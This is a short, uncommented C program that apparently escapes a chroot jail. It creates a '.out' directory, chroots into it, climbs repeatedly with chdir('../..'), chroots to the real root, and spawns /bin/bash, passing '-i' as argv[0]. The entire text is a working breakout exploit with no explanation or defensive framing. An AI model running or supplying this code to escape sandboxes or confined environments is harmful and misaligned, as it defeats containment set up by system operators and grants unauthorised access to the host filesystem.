#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
    mkdir(".out", 0755);
    chroot(".out");
    chdir("../../../../../../../../../../");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}
